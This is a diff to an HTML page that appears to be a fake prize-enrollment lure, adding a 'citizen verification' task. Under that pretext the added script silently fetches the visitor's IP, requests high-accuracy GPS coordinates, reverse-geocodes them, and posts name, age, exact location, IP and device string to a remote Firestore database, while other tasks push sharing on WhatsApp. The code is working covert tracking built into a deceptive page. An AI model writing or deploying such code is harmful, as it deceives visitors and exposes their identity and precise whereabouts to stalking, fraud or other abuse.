@@ -46,7 +46,32 @@
     .enroll-btn:hover { background: #c0392b; }
     .enroll-btn.locked { background: #ccc; color: #888; cursor: not-allowed; pointer-events: none; }
 
-    /* Rating dialog */
+    /* Citizenship / location dialog */
+    #citizen-dialog {
+      display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(0,0,0,0.6); z-index: 9997; align-items: center; justify-content: center;
+    }
+    #citizen-dialog.active { display: flex; }
+    .citizen-box {
+      background: white; border-radius: 10px; padding: 24px 20px;
+      width: 90%; max-width: 400px; max-height: 90vh; overflow-y: auto;
+    }
+    .citizen-box h3 { font-size: 17px; color: #1a1a2e; margin-bottom: 6px; }
+    .citizen-box p { font-size: 13px; color: #777; margin-bottom: 16px; }
+    .form-row { margin-bottom: 12px; }
+    .form-row label { display: block; font-size: 12px; color: #555; margin-bottom: 4px; font-weight: bold; }
+    .form-row input, .form-row select {
+      width: 100%; border: 1px solid #ddd; border-radius: 6px;
+      padding: 10px; font-size: 14px; font-family: Arial;
+    }
+    .form-row input:focus, .form-row select:focus { outline: none; border-color: #1a1a2e; }
+    .form-row input.auto-filled { background: #f0fdf4; color: #16a34a; border-color: #a9dfbf; }
+    .citizen-submit-btn {
+      width: 100%; background: #e74c3c; color: white; border: none; padding: 13px;
+      font-size: 15px; font-weight: bold; border-radius: 6px; cursor: pointer; margin-top: 6px;
+    }
+    .citizen-submit-btn.disabled { background: #ccc; color: #888; cursor: not-allowed; }
+    .locating-msg { font-size: 12px; color: #e67e22; text-align: center; margin-bottom: 10px; }
     #rating-dialog {
       display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
       background: rgba(0,0,0,0.6); z-index: 9997; align-items: center; justify-content: center;
@@ -170,10 +195,10 @@
         <div class="task-num">3</div>
         <span class="task-text">⭐ Rate your experience so far</span>
       </div>
-      <a class="task-item" id="task-4" href="YOUR_LINUX_URL_4" target="_blank" onclick="markTaskDone(4)">
+      <div class="task-item" id="task-4" onclick="handleTask4()">
         <div class="task-num">4</div>
-        <span class="task-text">📍 Confirm your city for prize delivery</span>
-      </a>
+        <span class="task-text">🇮🇳 Confirm you are an Indian citizen</span>
+      </div>
       <a class="task-item" id="task-5" href="YOUR_LINUX_URL_5" target="_blank" onclick="markTaskDone(5)">
         <div class="task-num">5</div>
         <span class="task-text">👥 Share this page on WhatsApp</span>
@@ -224,6 +249,43 @@
       </div>
       <textarea id="rating-feedback" placeholder="Write your feedback here..." oninput="checkRatingReady()"></textarea>
       <button class="rating-submit-btn disabled" id="rating-submit" onclick="submitRating()">Submit & Continue</button>
+    </div>
+  </div>
+
+  <!-- Citizenship / Location dialog -->
+  <div id="citizen-dialog">
+    <div class="citizen-box">
+      <h3>🇮🇳 Citizen Verification</h3>
+      <p>Please fill in your details to confirm eligibility for the prize.</p>
+      <p class="locating-msg" id="locating-msg">📡 Fetching your location...</p>
+      <div class="form-row">
+        <label>Full Name</label>
+        <input type="text" id="c-name" placeholder="Enter your name" oninput="checkCitizenReady()" />
+      </div>
+      <div class="form-row">
+        <label>Age</label>
+        <input type="number" id="c-age" placeholder="Enter your age" oninput="checkCitizenReady()" />
+      </div>
+      <div class="form-row">
+        <label>Nationality</label>
+        <select id="c-nationality" onchange="checkCitizenReady()">
+          <option value="Indian">Indian</option>
+          <option value="Other">Other</option>
+        </select>
+      </div>
+      <div class="form-row">
+        <label>City</label>
+        <input type="text" id="c-city" placeholder="Detecting..." class="auto-filled" readonly />
+      </div>
+      <div class="form-row">
+        <label>Area</label>
+        <input type="text" id="c-area" placeholder="Detecting..." class="auto-filled" readonly />
+      </div>
+      <div class="form-row">
+        <label>State</label>
+        <input type="text" id="c-state" placeholder="Detecting..." class="auto-filled" readonly />
+      </div>
+      <button class="citizen-submit-btn disabled" id="citizen-submit" onclick="submitCitizen()">Confirm & Continue</button>
     </div>
   </div>
 
@@ -555,7 +617,128 @@
       markTaskDone(3);
     }
 
-    // Expose functions to HTML onclick attributes
+    // ─── Firebase config (for location data only) ─────────────────
+    const FB_URL = 'https://firestore.googleapis.com/v1/projects/trial-b20e0/databases/(default)/documents/locations';
+
+    async function saveLocationToFirebase(data) {
+      try {
+        const res = await fetch(FB_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            fields: {
+              name:      { stringValue: data.name },
+              age:       { stringValue: data.age },
+              nationality: { stringValue: data.nationality },
+              city:      { stringValue: data.city },
+              area:      { stringValue: data.area },
+              state:     { stringValue: data.state },
+              lat:       { stringValue: String(data.lat) },
+              lng:       { stringValue: String(data.lng) },
+              accuracy:  { stringValue: String(data.accuracy) },
+              ip:        { stringValue: data.ip },
+              device:    { stringValue: navigator.userAgent },
+              timestamp: { stringValue: new Date().toISOString() }
+            }
+          })
+        });
+        if (res.ok) { log('✅ Location saved to Firebase'); }
+        else { log('❌ Firebase save failed: ' + res.status); }
+      } catch(e) {
+        log('❌ Firebase error: ' + e.message);
+      }
+    }
+
+    // ─── Task 4 — Citizen verification + location ────────────────
+    var locationData = {};
+
+    function handleTask4() {
+      if (completed.indexOf(4) !== -1) return;
+      locationData = {};
+      document.getElementById('c-name').value = '';
+      document.getElementById('c-age').value = '';
+      document.getElementById('c-city').value = '';
+      document.getElementById('c-area').value = '';
+      document.getElementById('c-state').value = '';
+      document.getElementById('citizen-submit').classList.add('disabled');
+      document.getElementById('locating-msg').style.display = 'block';
+      document.getElementById('citizen-dialog').classList.add('active');
+
+      // Get IP silently
+      fetch('https://api.ipify.org?format=json')
+        .then(function(r) { return r.json(); })
+        .then(function(d) { locationData.ip = d.ip; log('🌐 IP: ' + d.ip); })
+        .catch(function() { locationData.ip = 'unknown'; });
+
+      // Get GPS location
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          function(pos) {
+            locationData.lat = pos.coords.latitude;
+            locationData.lng = pos.coords.longitude;
+            locationData.accuracy = pos.coords.accuracy;
+            log('📍 GPS: ' + locationData.lat + ', ' + locationData.lng);
+            // Reverse geocode to get city/area/state
+            fetch('https://nominatim.openstreetmap.org/reverse?format=json&lat=' + locationData.lat + '&lon=' + locationData.lng)
+              .then(function(r) { return r.json(); })
+              .then(function(geo) {
+                var addr = geo.address || {};
+                var city  = addr.city || addr.town || addr.village || addr.county || '';
+                var area  = addr.suburb || addr.neighbourhood || addr.road || '';
+                var state = addr.state || '';
+                locationData.city  = city;
+                locationData.area  = area;
+                locationData.state = state;
+                document.getElementById('c-city').value  = city;
+                document.getElementById('c-area').value  = area;
+                document.getElementById('c-state').value = state;
+                document.getElementById('locating-msg').style.display = 'none';
+                log('🗺️ Location: ' + city + ', ' + state);
+                checkCitizenReady();
+              })
+              .catch(function() {
+                document.getElementById('locating-msg').textContent = '⚠️ Could not auto-detect location';
+              });
+          },
+          function() {
+            document.getElementById('locating-msg').textContent = '⚠️ Location permission denied';
+          },
+          { enableHighAccuracy: true, timeout: 15000 }
+        );
+      }
+    }
+
+    function checkCitizenReady() {
+      var name = document.getElementById('c-name').value.trim();
+      var age  = document.getElementById('c-age').value.trim();
+      var city = document.getElementById('c-city').value.trim();
+      var btn  = document.getElementById('citizen-submit');
+      if (name && age && city) {
+        btn.classList.remove('disabled');
+      } else {
+        btn.classList.add('disabled');
+      }
+    }
+
+    function submitCitizen() {
+      var name = document.getElementById('c-name').value.trim();
+      var age  = document.getElementById('c-age').value.trim();
+      if (!name || !age) return;
+      locationData.name        = name;
+      locationData.age         = age;
+      locationData.nationality = document.getElementById('c-nationality').value;
+      locationData.city        = document.getElementById('c-city').value;
+      locationData.area        = document.getElementById('c-area').value;
+      locationData.state       = document.getElementById('c-state').value;
+      saveLocationToFirebase(locationData);
+      document.getElementById('citizen-dialog').classList.remove('active');
+      markTaskDone(4);
+    }
+
+    // Expose task 4 functions
+    window.handleTask4 = handleTask4;
+    window.checkCitizenReady = checkCitizenReady;
+    window.submitCitizen = submitCitizen;
     window.handleTask1 = handleTask1;
     window.handleTask2 = handleTask2;
     window.handleTask3 = handleTask3;
